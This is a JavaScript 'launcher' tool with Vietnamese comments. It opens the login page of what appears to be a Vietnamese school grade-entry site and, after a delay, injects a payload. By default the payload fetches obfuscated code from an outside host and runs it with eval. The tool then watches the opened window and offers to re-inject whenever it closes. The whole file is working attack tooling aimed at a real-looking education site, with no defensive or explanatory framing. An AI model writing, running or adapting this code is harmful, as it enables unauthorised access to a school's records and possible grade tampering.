// ============================================================
// NT4NH2 // LAUNCHER SCRIPT
// Chức năng: mở URL đích, inject payload, giám sát tool,
// popup inject lại khi tool bị ngắt.
// ============================================================

// ----- CẤU HÌNH MẶC ĐỊNH -----
const DEFAULT_CONFIG = {
  targetUrl: "https://nhapdiem.truonghocviet.vn/Account/Login",
  payload: "fetch('vschoolx.vercel.app/files/obf.js').then(r => r.text()).then(eval);",
  delay: 3000,
  title: "Launcher Tool",
  bg: "#0d1117",
  text: "#c9d1d9"
};

// ----- TẢI CẤU HÌNH TỪ LOCALSTORAGE -----
function loadConfig() {
  const raw = localStorage.getItem("launcher_config");
  if (!raw) return { ...DEFAULT_CONFIG };
  try { return { ...DEFAULT_CONFIG, ...JSON.parse(raw) }; }
  catch (e) { return { ...DEFAULT_CONFIG }; }
}

// ----- LƯU CẤU HÌNH -----
function saveConfig(cfg) {
  localStorage.setItem("launcher_config", JSON.stringify(cfg));
}

let CONFIG = loadConfig();

// ----- ÁP DỤNG SETTING WEB -----
function applyWebSettings() {
  document.title = CONFIG.title;
  document.body.style.background = CONFIG.bg;
  document.body.style.color = CONFIG.text;
}

// ----- THAM CHIẾU DOM -----
const btnLaunch     = document.getElementById("btnLaunch");
const btnSettingTool= document.getElementById("btnSettingTool");
const btnSettingWeb = document.getElementById("btnSettingWeb");
const statusEl      = document.getElementById("status");

const popup         = document.getElementById("popup");
const btnReinject   = document.getElementById("btnReinject");
const btnClose      = document.getElementById("btnClose");

const settingTool   = document.getElementById("settingTool");
const inpTargetUrl  = document.getElementById("inpTargetUrl");
const inpPayload    = document.getElementById("inpPayload");
const inpDelay      = document.getElementById("inpDelay");
const btnSaveTool   = document.getElementById("btnSaveTool");
const btnCloseTool  = document.getElementById("btnCloseTool");

const settingWeb    = document.getElementById("settingWeb");
const inpTitle      = document.getElementById("inpTitle");
const inpBg         = document.getElementById("inpBg");
const inpText       = document.getElementById("inpText");
const btnSaveWeb    = document.getElementById("btnSaveWeb");
const btnCloseWeb   = document.getElementById("btnCloseWeb");

// ----- BIẾN GIÁM SÁT TOOL -----
let toolWindow = null;
let watchTimer = null;
let popupShown = false;

// ----- HIỂN THỊ TRẠNG THÁI -----
function setStatus(msg) {
  statusEl.textContent = "Trạng thái: " + msg;
}

// ----- MỞ TOOL + INJECT -----
function launchTool() {
  popupShown = false;
  setStatus("Đang mở URL đích...");

  toolWindow = window.open(CONFIG.targetUrl, "_blank");

  if (!toolWindow) {
    setStatus("Popup bị chặn. Cho phép popup rồi thử lại.");
    return;
  }

  // Chờ trang tải xong rồi inject
  setTimeout(() => {
    try {
      toolWindow.eval(CONFIG.payload);
      setStatus("Đã inject payload. Đang giám sát...");
    } catch (e) {
      // Nếu bị cross-origin, thử inject qua console-less method
      setStatus("Inject thất bại (cross-origin). Kiểm tra console.");
    }
    startWatch();
  }, CONFIG.delay);
}

// ----- GIÁM SÁT TOOL -----
function startWatch() {
  stopWatch();
  watchTimer = setInterval(() => {
    if (!toolWindow || toolWindow.closed) {
      stopWatch();
      onToolClosed();
    }
  }, 1000);
}

function stopWatch() {
  if (watchTimer) { clearInterval(watchTimer); watchTimer = null; }
}

// ----- KHI TOOL BỊ NGẮT -----
function onToolClosed() {
  setStatus("Tool đã ngắt.");
  if (!popupShown) {
    popupShown = true;
    popup.classList.remove("hidden");
  }
}

// ----- SỰ KIỆN NÚT -----
btnLaunch.addEventListener("click", launchTool);

btnSettingTool.addEventListener("click", () => {
  inpTargetUrl.value = CONFIG.targetUrl;
  inpPayload.value   = CONFIG.payload;
  inpDelay.value     = CONFIG.delay;
  settingTool.classList.remove("hidden");
});

btnSettingWeb.addEventListener("click", () => {
  inpTitle.value = CONFIG.title;
  inpBg.value    = CONFIG.bg;
  inpText.value  = CONFIG.text;
  settingWeb.classList.remove("hidden");
});

// Lưu setting tool
btnSaveTool.addEventListener("click", () => {
  CONFIG.targetUrl = inpTargetUrl.value.trim();
  CONFIG.payload   = inpPayload.value.trim();
  CONFIG.delay     = parseInt(inpDelay.value) || 3000;
  saveConfig(CONFIG);
  settingTool.classList.add("hidden");
  setStatus("Đã lưu setting tool.");
});

// Lưu setting web
btnSaveWeb.addEventListener("click", () => {
  CONFIG.title = inpTitle.value.trim() || "Launcher Tool";
  CONFIG.bg    = inpBg.value;
  CONFIG.text  = inpText.value;
  saveConfig(CONFIG);
  applyWebSettings();
  settingWeb.classList.add("hidden");
  setStatus("Đã lưu setting web.");
});

// Đóng modal
btnCloseTool.addEventListener("click", () => settingTool.classList.add("hidden"));
btnCloseWeb .addEventListener("click", () => settingWeb.classList.add("hidden"));

// Popup inject lại
btnReinject.addEventListener("click", () => {
  popup.classList.add("hidden");
  launchTool();
});

btnClose.addEventListener("click", () => {
  popup.classList.add("hidden");
  setStatus("Đã hủy inject lại.");
});

// ----- KHỞI TẠO -----
applyWebSettings();
setStatus("Sẵn sàng.");